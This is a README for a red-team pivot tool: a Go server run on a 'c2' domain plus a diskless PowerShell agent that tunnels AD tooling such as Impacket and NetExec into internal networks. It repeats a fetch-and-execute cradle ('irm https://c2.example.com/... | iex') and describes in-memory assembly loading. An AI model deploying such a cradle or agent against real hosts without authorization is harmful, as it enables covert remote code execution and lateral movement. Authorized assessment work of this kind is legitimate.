# PS-Proxy

PS-Proxy is being rebuilt as a professional route-based pivot with a Go Linux
server and a single-file PowerShell 5.1 agent. The project goal is reliable
operation for TCP-heavy AD tooling such as Impacket, NetExec, RustHound,
`ldapsearch`, and TCP-connect `nmap`, without proxychains and without requiring
administrator privileges on the Windows agent host.

> Current repository status: this tree is the new implementation foundation. It
> replaces the previous Python/SOCKS/TUN prototype with a Go server skeleton,
> one-time enrollment staging, and a diskless PowerShell/C# agent packaging
> model. The full TUN/netstack data plane is the next implementation milestone.

## Design decisions

- **Server:** Go, intended to run as root on Linux.
- **Data plane:** true TUN/netstack design, not proxychains and not a Python
  hand-written TCP shim.
- **Agent:** Windows PowerShell 5.1 loader with a precompiled C# core embedded
  into a single `.ps1`.
- **Agent delivery:** one command, one file, no separate DLL transfer:
  `irm https://server/a/<one-time-id> | iex`.
- **Target-side privileges:** no local admin required on the Windows agent host.
- **Enrollment:** the server creates a short-lived one-time staging URL. The
  generated agent script contains an enrollment token rather than a long-term
  PSK.
- **TLS:** server certificate pinning remains mandatory for the agent. The
  loader and C# core are designed so the agent refuses to enroll unless the
  presented server certificate matches the pinned SHA-256 DER hash.
- **Disk behavior:** release agents do not use `Add-Type`, do not invoke
  `csc.exe` on the target, and do not intentionally write the managed agent DLL
  to disk. The embedded DLL is loaded with
  `[System.Reflection.Assembly]::Load(byte[])`.

## Repository layout

```text
cmd/psproxy-server/          Go server entrypoint
internal/staging/            one-time agent staging/enrollment helpers
agent/PSProxy.Agent/         PowerShell 5.1-compatible C# agent core source
agent/loader/agent.ps1.tmpl  single-file PowerShell loader template
release/agent.ps1            packaged release agent placeholder/artifact
tools/build-agent.ps1        Windows build script for release/agent.ps1
agent.ps1                    source-checkout pointer to release agent workflow
```

The GitHub repository intentionally contains both source code and a release
agent location. Packaged releases should replace `release/agent.ps1` with a
ready-to-run generated file so an operator can download and run without doing
manual packaging.

## Build the Go server

```bash
go build ./cmd/psproxy-server
```

## Build the single-file PowerShell agent

The first target is Windows PowerShell 5.1, so the release agent is built on a
Windows machine using the .NET Framework C# compiler:

```powershell
powershell -ExecutionPolicy Bypass -File tools/build-agent.ps1
```

That command compiles `agent/PSProxy.Agent/PSProxy.Agent.cs`, compresses the DLL,
base64-embeds it into `agent/loader/agent.ps1.tmpl`, and writes
`release/agent.ps1`.

The Windows target still receives only one PowerShell script. The build step is
for the release maintainer, not the operator running the agent.

## Operator flow goal

Start the server on the Ubuntu/VPS side:

```bash
sudo ./psproxy-server \
  --domain c2.example.com \
  --cert /etc/letsencrypt/live/c2.example.com/fullchain.pem \
  --key /etc/letsencrypt/live/c2.example.com/privkey.pem \
  --tun psproxy0 \
  --route 10.10.10.0/24
```

The server prints a one-time command:

```powershell
irm https://c2.example.com/a/<one-time-id> | iex
```

The generated script auto-starts, loads the embedded C# core in memory, validates
the pinned server certificate, and enrolls with the one-time token. Long-term
static PSKs are intentionally avoided in the new design.

## Current implementation status

Implemented now:

- Go server build skeleton.
- TLS listener using operator-supplied certificate and key.
- Leaf certificate pin calculation for the generated agent configuration.
- Short-lived one-time staging URLs.
- One-time enrollment token validation endpoint.
- PowerShell loader template that loads a compressed/base64 managed assembly from
  memory.
- Windows build script to package the C# core into `release/agent.ps1`.
- C# agent core scaffold with certificate pin validation and enrollment request.

Next milestone:

- Replace the scaffold enrollment-only path with the full multiplexed tunnel
  protocol.
- Add the Go TUN/netstack data plane.
- Add route setup/cleanup and `doctor` checks.
- Add integration tests for LDAP/RustHound-scale long-running TCP streams.

## Security notes

- Use HTTPS staging. Plain HTTP `irm | iex` is mechanically possible, but it is
  not acceptable for sensitive environments because staging tampering means code
  execution on the Windows host.
- The agent's tunnel connection must pin the server certificate. Certificate pin
  mismatch is fatal.
- Enrollment URLs should be short-lived and one-time use.
- The enrollment token is placed in the HTTPS response body, not in the URL.
- Do not log generated agent bodies or enrollment tokens.
- The loader avoids intentional target-side file writes for the managed payload,
  but host telemetry, PowerShell logging, AMSI, EDR, crash dumps, or pagefile
  behavior are outside the loader's control.

## Testing direction

Before this project should be trusted for real assessments, it needs a lab test
matrix that includes:

- large bidirectional byte-stream integrity tests;
- many concurrent stream tests;
- long-running LDAP/RustHound collection tests;
- NetExec SMB/LDAP tests;
- Impacket SMB/LDAP/RPC tests;
- reconnect and stale route cleanup tests;
- malformed frame and enrollment fuzz tests;
- certificate pin mismatch tests.
